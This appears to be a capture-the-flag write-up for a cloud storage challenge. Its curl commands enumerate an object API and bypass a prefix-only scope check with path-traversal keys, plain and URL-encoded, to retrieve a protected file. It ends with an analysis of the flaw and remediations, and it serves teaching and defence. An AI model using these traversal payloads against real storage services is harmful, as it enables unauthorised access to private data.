+++
date = '2026-10-07T15:20:00+03:00'
draft = false
title = 'Harbor Lights — PwnZone CTF 2026'
tags = ["PwnZone CTF 2026", "Cloud", "Cloud Security", "Object Storage", "Path Traversal", "Access Control Bypass", "URL Encoding", "CTF Writeup"]
feature = 'feature.png'
showTableOfContents = true
+++

## Overview

Harbor Lights was a cloud security challenge built around an object storage API with scope-based access control, hosted at `http://54.72.82.22:8390`. The scope check only validated that object keys started with `public/` but never normalized path traversal sequences (`..`) before authorization. I escaped the `public/` namespace by crafting a key like `public/../finance/final.txt` and retrieved the protected finance object containing the flag.

## Step 1: Reconnaissance and Enumeration

I fetched the landing page to understand the service surface.

```
curl -s -i http://54.72.82.22:8390/
```

**Key Findings:**

- Materials: `/downloads/storage.json`
- API: `GET /api/objects` lists public object keys; `GET /api/object?key=...` retrieves an object

I downloaded the storage manifest to inspect the scope configuration and inventory.

```
curl -s http://54.72.82.22:8390/downloads/storage.json
```

```
{
  "scope": "public/*",
  "inventory": [
    "public/lineup.txt",
    "public/receipts.json",
    "finance/final.txt"
  ],
  "adapter": "edge-store/4"
}
```

The inventory listed `finance/final.txt` — an object outside the allowed `public/*` scope. I then listed the public objects the API would disclose.

```
curl -s http://54.72.82.22:8390/api/objects
```

```
{"keys": ["public/lineup.txt", "public/receipts.json"]}
```

## Step 2: Initial Access

I retrieved both public objects as a baseline.

```
curl -s "http://54.72.82.22:8390/api/object?key=public/lineup.txt"
curl -s "http://54.72.82.22:8390/api/object?key=public/receipts.json"
```

Both returned `{"body":"The next performance begins at eight."}` — a decoy. I then attempted to fetch the protected object directly.

```
curl -s -i "http://54.72.82.22:8390/api/object?key=finance/final.txt"
```

```
403 FORBIDDEN
{"message":"The request could not be completed.","ok":false}
```

The direct request was rejected by the scope check. I exploited path traversal by preserving the `public/` prefix so the authorization check passed, while the backend resolved the `..` after the check.

```
curl -s -G --data-urlencode "key=public/../finance/final.txt" \
  http://54.72.82.22:8390/api/object
```

```
{"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

I ran a few supporting tests to confirm the behavior:

| Key | Result |
|---|---|
| `public/%2e%2e/finance/final.txt` | Same flag (URL-encoded `..`) |
| `public/lineup.txt/../finance/final.txt` | Returned decoy (path resolved differently) |
| `public/LINEUP.txt` | Returned decoy (case-insensitive lookup) |
| Absolute/other forms | Rejected or decoy |

## Vulnerability Analysis

- **Naive prefix check:** Authorization validated `key.startsWith("public/")` only.
- **Late path resolution:** The backend object store normalized `..` after the scope check, allowing escape from the intended namespace.
- **Correct fix:** Canonicalize and validate the resolved path against the allowed scope before retrieval; reject any key containing traversal or that resolves outside the allowed root.

## Conclusion

Attack chain:

1. Storage manifest disclosed a protected `finance/` object outside the public scope
2. Direct access to the protected key returned 403
3. `public/../` path traversal bypassed the prefix-only scope check
4. Protected object retrieved, flag captured

Remediations:

- Canonicalize and resolve the full object key before evaluating the scope
- Reject keys containing `..`, encoded traversal sequences, or resolving outside the allowed root
- Deny by default — enumerate objects from the allowed scope rather than filtering user-supplied keys
